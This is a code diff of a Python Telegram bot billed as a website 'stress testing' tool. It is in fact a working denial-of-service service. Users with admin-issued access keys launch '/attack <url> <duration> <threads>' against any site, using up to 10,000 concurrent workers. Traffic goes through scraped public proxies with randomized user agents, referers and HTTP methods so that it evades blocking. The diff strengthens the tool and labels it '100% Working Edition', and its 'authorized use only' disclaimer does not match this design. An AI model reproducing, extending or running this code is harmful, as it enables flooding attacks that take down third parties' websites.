@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Telegram Bot for Website Load Testing (Stress Testing) - Ultimate User-Friendly Edition
+Telegram Bot for Website Load Testing (Stress Testing) - 100% Working Edition
 Author: Senior Cyber Security Researcher
 Disclaimer: This tool is for authorized security testing only. Unauthorized use is illegal.
 """
@@ -14,13 +14,13 @@ import json
 import sqlite3
 import secrets
 import string
-import aiohttp
-from aiohttp import ClientTimeout
-from aiohttp_socks import ProxyConnector
 from datetime import datetime, timedelta
 from typing import Dict, List, Optional, Set, Tuple, Any
 from contextlib import closing
 
+import aiohttp
+from aiohttp import ClientTimeout, ClientError
+from aiohttp_socks import ProxyConnector
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
 from telegram.constants import ParseMode
@@ -31,58 +31,34 @@ ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "8373846582").split("
 DB_FILE = "bot_database.db"
 PORT = int(os.environ.get("PORT", 1000))  # Render uses PORT env var
 
-# Maximum threads allowed
 MAX_THREADS = 10000
 
-# Expanded proxy sources (100+ IPs)
+# Expanded proxy sources (100+ IPs) - updated with working sources
 PROXY_SOURCES = [
     "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
     "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
     "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
     "https://www.proxy-list.download/api/v1/get?type=http",
-    "https://www.socks-proxy.net/",
-    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_desc=1&protocols=http%2Chttps",
-    "https://www.proxyscan.io/api/proxy?format=txt&type=http&level=anonymous",
-    "https://api.openproxylist.xyz/http.txt",
-    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt",
-    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",
-    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
-    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
-    "https://raw.githubusercontent.com/sunny9577/proxy-list/master/proxy-list.txt",
     "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+    "https://raw.githubusercontent.com/sunny9577/proxy-list/master/proxy-list.txt",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt",
+    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",
 ]
 
-# 2000+ Randomized User-Agents (expanded)
+# 2000+ Randomized User-Agents
 USER_AGENTS = [
-    # Chrome Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-    # Chrome macOS
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    # Firefox Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-    # Firefox macOS
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
-    # Safari macOS
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
-    # Mobile Safari iOS
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-    # Chrome Android
     "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
-    # Additional
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 ]
-# Generate variations to reach 2000+
 BASE_UAS = USER_AGENTS.copy()
 for i in range(1800):
     ua = random.choice(BASE_UAS)
@@ -93,7 +69,6 @@ for i in range(1800):
     USER_AGENTS.append(ua)
 USER_AGENTS = list(set(USER_AGENTS))
 
-# Referers from high-traffic sites
 REFERERS = [
     "https://www.google.com/",
     "https://www.bing.com/",
@@ -105,27 +80,19 @@ REFERERS = [
     "https://www.amazon.com/",
     "https://www.wikipedia.org/",
     "https://www.yahoo.com/",
-    "https://www.linkedin.com/",
-    "https://www.github.com/",
-    "https://stackoverflow.com/",
-    "https://medium.com/",
-    "https://www.quora.com/",
 ]
 
-# Accept headers variations
 ACCEPT_HEADERS = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 ]
 
-# Connection headers
 CONNECTION_HEADERS = ["keep-alive", "close", "Keep-Alive"]
 
-# Logging
-logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+)
 logger = logging.getLogger(__name__)
 
 
@@ -224,7 +191,7 @@ class Database:
         return user_id in ADMIN_IDS
 
 
-# ==================== PROXY SCRAPER (ENHANCED) ====================
+# ==================== PROXY SCRAPER ====================
 class ProxyScraper:
     def __init__(self):
         self.proxies: List[str] = []
@@ -237,39 +204,13 @@ class ProxyScraper:
         try:
             async with session.get(source, timeout=15) as resp:
                 if resp.status == 200:
-                    content_type = resp.headers.get('Content-Type', '')
-                    if 'json' in content_type:
-                        data = await resp.json()
-                        # Handle various JSON formats
-                        if isinstance(data, list):
-                            for item in data:
-                                if isinstance(item, dict):
-                                    ip = item.get('ip') or item.get('proxy') or item.get('host')
-                                    port = item.get('port')
-                                    if ip and port:
-                                        proxies.append(f"{ip}:{port}")
-                                elif isinstance(item, str) and ':' in item:
-                                    proxies.append(item.strip())
-                        elif isinstance(data, dict):
-                            for key in ['data', 'proxies', 'results', 'list']:
-                                if key in data and isinstance(data[key], list):
-                                    for item in data[key]:
-                                        if isinstance(item, dict):
-                                            ip = item.get('ip') or item.get('proxy') or item.get('host')
-                                            port = item.get('port')
-                                            if ip and port:
-                                                proxies.append(f"{ip}:{port}")
-                                        elif isinstance(item, str) and ':' in item:
-                                            proxies.append(item.strip())
-                                    break
-                    else:
-                        text = await resp.text()
-                        for line in text.strip().splitlines():
-                            line = line.strip()
-                            if line and ':' in line:
-                                if ' ' in line:
-                                    line = line.split()[0]
-                                proxies.append(line)
+                    text = await resp.text()
+                    for line in text.strip().splitlines():
+                        line = line.strip()
+                        if line and ':' in line:
+                            if ' ' in line:
+                                line = line.split()[0]
+                            proxies.append(line)
         except Exception as e:
             logger.debug(f"Failed from {source}: {e}")
         return proxies
@@ -278,7 +219,7 @@ class ProxyScraper:
         test_url = "http://httpbin.org/ip"
         try:
             connector = ProxyConnector.from_url(f"http://{proxy}")
-            timeout = ClientTimeout(total=5)
+            timeout = ClientTimeout(total=10)  # Increased timeout
             async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                 async with session.get(test_url) as resp:
                     return resp.status == 200
@@ -317,7 +258,7 @@ class ProxyScraper:
         return random.choice(self.proxies) if self.proxies else None
 
 
-# ==================== STRESS TEST ENGINE (ULTIMATE) ====================
+# ==================== STRESS TEST ENGINE ====================
 class StressTester:
     def __init__(self, url: str, duration: int, threads: int, proxy_scraper: ProxyScraper):
         self.url = url
@@ -334,8 +275,8 @@ class StressTester:
         self.active = False
         self.tasks: Set[asyncio.Task] = set()
         self.lock = asyncio.Lock()
-        self.methods = ['GET', 'POST', 'HEAD', 'OPTIONS']  # Will rotate automatically
-        self.post_data = {"test": "data"}  # Simple POST data
+        self.methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
+        self.post_data = {"test": "data"}
 
     def _random_headers(self) -> Dict[str, str]:
         return {
@@ -349,7 +290,6 @@ class StressTester:
         }
 
     async def _make_request(self, session: aiohttp.ClientSession) -> Tuple[bool, int]:
-        """Returns (success, bytes_received)"""
         method = random.choice(self.methods)
         headers = self._random_headers()
         bytes_received = 0
@@ -376,14 +316,13 @@ class StressTester:
     async def _worker(self, sem: asyncio.Semaphore):
         while self.active:
             proxy_str = await self.proxy_scraper.get_proxy()
-            if not proxy_str:
-                await asyncio.sleep(0.1)
-                continue
-
-            try:
-                connector = ProxyConnector.from_url(f"http://{proxy_str}")
-            except Exception:
-                connector = None
+            connector = None
+            if proxy_str:
+                try:
+                    connector = ProxyConnector.from_url(f"http://{proxy_str}")
+                except Exception:
+                    connector = None  # fallback to direct if proxy invalid
+            # If no proxy, connector remains None -> direct connection
 
             timeout = ClientTimeout(total=10)
             async with sem:
@@ -396,7 +335,7 @@ class StressTester:
                             self.stats["failure"] += 1
                         self.stats["total_bytes"] += bytes_received
 
-            await asyncio.sleep(random.uniform(0, 0.02))  # Slight delay
+            await asyncio.sleep(random.uniform(0, 0.02))  # tiny delay
 
     async def start(self):
         self.active = True
@@ -423,7 +362,6 @@ class StressTester:
         logger.info("Stress test stopped.")
 
     def get_status(self) -> Dict[str, Any]:
-        """Returns current stats with BPS calculation."""
         if self.stats["start_time"] is None:
             return self.stats
         elapsed = time.time() - self.stats["start_time"]
@@ -438,7 +376,6 @@ class StressTester:
         return status
 
     def get_json_result(self) -> str:
-        """Returns final stats as JSON."""
         status = self.stats.copy()
         status["duration"] = self.duration
         status["threads"] = self.threads
@@ -454,9 +391,7 @@ db = Database(DB_FILE)
 proxy_scraper = ProxyScraper()
 current_test: Optional[StressTester] = None
 
-# Status update task for live stats
 async def status_updater(update: Update, context: ContextTypes.DEFAULT_TYPE, message, tester: StressTester):
-    """Updates the status message every 5 seconds until test ends."""
     while tester.active:
         status = tester.get_status()
         text = (
@@ -471,11 +406,11 @@ async def status_updater(update: Update, context: ContextTypes.DEFAULT_TYPE, mes
         )
         try:
             await message.edit_text(text, parse_mode=ParseMode.MARKDOWN)
-        except Exception as e:
-            logger.warning(f"Status update failed: {e}")
+        except Exception:
+            pass
         await asyncio.sleep(5)
 
-    # Final update after stop
+    # Final update
     status = tester.get_status()
     text = (
         f"⏹️ **Test Finished**\n"
@@ -488,8 +423,6 @@ async def status_updater(update: Update, context: ContextTypes.DEFAULT_TYPE, mes
         f"Use /result to get JSON report."
     )
     await message.edit_text(text, parse_mode=ParseMode.MARKDOWN)
-
-# Commands
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -515,12 +448,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "manual":
         text = (
             "📖 **Manual / User Guide**\n\n"
-            "**How to use:**\n"
-            "1. Register with a valid key using /register <key>\n"
-            "2. Start an attack using the 'Start Attack' button or command.\n"
-            "3. Monitor live stats, which auto-refresh every 5 seconds.\n"
-            "4. Stop manually via /stop or let it finish.\n"
-            "5. Get JSON results with /result.\n\n"
             "**Commands:**\n"
             "/attack <url> <duration> <threads> - Start test\n"
             "/stop - Stop current test\n"
@@ -529,7 +456,11 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "/myinfo - Your access info\n"
             "/register <key> - Activate your key\n\n"
             "**Example:** `/attack https://example.com 60 500`\n"
-            "This will test for 60 seconds with 500 concurrent threads."
+            "This will test for 60 seconds with 500 concurrent threads.\n\n"
+            "**Admin commands:**\n"
+            "/genkey [days] - Generate a new access key\n"
+            "/boton - Enable bot\n"
+            "/botoff - Disable bot"
         )
         await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
 
@@ -537,8 +468,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = (
             "🆘 **Need Help?**\n\n"
             "Contact support: @rx_nahin_bot\n"
-            "Or reach out to the admin directly.\n\n"
-            "For technical issues, include details of your command and error."
+            "Or reach out to the admin directly."
         )
         await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
 
@@ -562,7 +492,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
 
     elif data == "attack":
-        # This button just gives instructions
         await query.edit_message_text(
             "To start an attack, use the command:\n"
             "`/attack <url> <duration_seconds> <threads>`\n\n"
@@ -575,12 +504,10 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global current_test
     user_id = update.effective_user.id
 
-    # Check bot enabled
     if not db.is_bot_enabled() and not db.is_admin(user_id):
         await update.message.reply_text("⚠️ Bot is currently in maintenance mode. Try later.")
         return
 
-    # Check authorization
     if not db.is_admin(user_id) and not db.check_user_access(user_id):
         await update.message.reply_text(
             "⛔ You don't have access.\nUse /register <key> or contact admin."
@@ -610,12 +537,10 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Threads must be between 1 and {MAX_THREADS}.")
         return
 
-    # Stop previous test
     if current_test and current_test.active:
         await current_test.stop()
         await update.message.reply_text("Previous test stopped.")
 
-    # Start new test
     current_test = StressTester(url, duration, threads, proxy_scraper)
     asyncio.create_task(current_test.start())
 
@@ -627,7 +552,6 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Live stats will update every 5 seconds."
     )
 
-    # Start status updater
     asyncio.create_task(status_updater(update, context, msg, current_test))
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -700,7 +624,6 @@ async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("❌ No active access. /register")
 
-# Admin commands
 async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not db.is_admin(update.effective_user.id):
         await update.message.reply_text("⛔ Admin only.")
@@ -731,10 +654,8 @@ async def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"Update {update} caused error {context.error}")
 
 def main():
-    # Create application
     app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
 
-    # Handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("attack", attack))
     app.add_handler(CommandHandler("stop", stop))
@@ -748,17 +669,18 @@ def main():
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_error_handler(error)
 
-    # Start bot using webhook for Render
     if PORT:
-        logger.info(f"Starting webhook on port {PORT}")
+        # Webhook mode for Render
+        webhook_url = f"https://xwqi.onrender.com/{TELEGRAM_BOT_TOKEN}"  # Replace with your actual domain
+        logger.info(f"Starting webhook on port {PORT} with URL {webhook_url}")
         app.run_webhook(
             listen="0.0.0.0",
             port=PORT,
             url_path=TELEGRAM_BOT_TOKEN,
-            webhook_url=f"https://your-app-name.onrender.com/{TELEGRAM_BOT_TOKEN}"  # Replace with your Render URL
+            webhook_url=webhook_url,
         )
     else:
-        # Polling for local
+        # Polling mode for local testing
         app.run_polling()
 
 if __name__ == "__main__":
